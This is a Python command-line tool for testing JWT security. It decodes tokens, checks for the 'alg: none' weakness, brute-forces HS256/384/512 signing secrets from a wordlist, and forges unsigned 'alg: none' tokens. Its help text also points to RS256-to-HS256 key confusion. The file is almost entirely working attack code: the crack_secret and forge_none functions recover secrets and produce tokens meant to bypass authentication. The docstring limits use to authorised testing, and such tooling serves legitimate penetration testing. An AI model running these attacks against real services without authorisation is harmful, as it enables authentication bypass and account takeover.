#!/usr/bin/env python3
"""
JWT Tool
--------
A small JWT (JSON Web Token) security testing utility. No external
dependencies (uses only the standard library).

Features:
  decode        Decode header/payload without verifying signature
  check-alg     Flag if the token allows the insecure "alg: none" bypass
  crack         Brute-force an HS256/HS384/HS512 secret against a wordlist
  forge-none    Generate an "alg: none" token from an existing payload (for
                testing whether a target server improperly accepts it)

Intended for use ONLY against systems/tokens you own or are explicitly
authorized to test.

Usage:
    python jwt_tool.py decode <token>
    python jwt_tool.py check-alg <token>
    python jwt_tool.py crack <token> --wordlist secrets.txt
    python jwt_tool.py forge-none <token>
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys

ALG_TO_HASH = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def b64url_decode(segment):
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def split_token(token):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Not a valid JWT (expected 3 dot-separated segments).", file=sys.stderr)
        sys.exit(1)
    return parts


def decode_token(token, quiet=False):
    header_b64, payload_b64, sig_b64 = split_token(token)
    try:
        header = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))
    except (ValueError, UnicodeDecodeError) as e:
        print(f"[!] Could not parse token: {e}", file=sys.stderr)
        sys.exit(1)
    if not quiet:
        print("[*] Header:")
        print(json.dumps(header, indent=2))
        print("[*] Payload:")
        print(json.dumps(payload, indent=2))
    return header, payload, sig_b64


def check_alg(token):
    header, _, _ = decode_token(token, quiet=True)
    alg = header.get("alg", "")
    print(f"[*] alg = {alg}")
    if alg.lower() == "none":
        print("[!] VULNERABLE: token already uses alg=none.")
    elif alg in ALG_TO_HASH:
        print(f"[*] Uses symmetric signing ({alg}). Consider testing:")
        print("    - 'crack' subcommand against a secret wordlist")
        print("    - 'forge-none' to see if the server improperly accepts alg=none")
    elif alg.startswith("RS") or alg.startswith("ES"):
        print(f"[*] Uses asymmetric signing ({alg}). Consider testing for the classic")
        print("    RS256->HS256 key-confusion bug (server verifies HS256 using its own public key).")
    else:
        print("[*] Unrecognized alg, manual review recommended.")


def crack_secret(token, wordlist_path):
    header, payload, sig_b64 = split_token(token)
    header_dict = json.loads(b64url_decode(header))
    alg = header_dict.get("alg", "")
    hash_fn = ALG_TO_HASH.get(alg)
    if not hash_fn:
        print(f"[!] alg '{alg}' is not a supported HMAC algorithm (HS256/384/512).", file=sys.stderr)
        sys.exit(1)

    signing_input = f"{header}.{payload}".encode()
    target_sig = b64url_decode(sig_b64)

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            candidates = [line.strip() for line in f if line.strip()]
    except OSError as e:
        print(f"[!] Could not read wordlist: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Trying {len(candidates)} candidate secrets against {alg}...")
    for secret in candidates:
        computed = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(computed, target_sig):
            print(f"[!] SECRET FOUND: {secret!r}")
            return secret
    print("[*] No match found in wordlist.")
    return None


def forge_none(token):
    header, payload, _ = split_token(token)
    header_dict = json.loads(b64url_decode(header))
    header_dict["alg"] = "none"
    new_header = b64url_encode(json.dumps(header_dict, separators=(",", ":")).encode())
    forged = f"{new_header.decode()}.{payload}.".encode().decode()
    print("[*] Forged alg=none token (empty signature):")
    print(forged)
    print("[*] Test whether the target server incorrectly accepts this as valid.")
    return forged


def main():
    parser = argparse.ArgumentParser(description="JWT security testing utility.")
    sub = parser.add_subparsers(dest="command", required=True)

    p_decode = sub.add_parser("decode", help="Decode header/payload without verifying signature")
    p_decode.add_argument("token")

    p_alg = sub.add_parser("check-alg", help="Report the signing algorithm and likely attack vectors")
    p_alg.add_argument("token")

    p_crack = sub.add_parser("crack", help="Brute-force an HMAC secret against a wordlist")
    p_crack.add_argument("token")
    p_crack.add_argument("--wordlist", required=True)

    p_forge = sub.add_parser("forge-none", help="Generate an alg=none version of the token")
    p_forge.add_argument("token")

    args = parser.parse_args()

    if args.command == "decode":
        decode_token(args.token)
    elif args.command == "check-alg":
        check_alg(args.token)
    elif args.command == "crack":
        crack_secret(args.token, args.wordlist)
    elif args.command == "forge-none":
        forge_none(args.token)


if __name__ == "__main__":
    main()
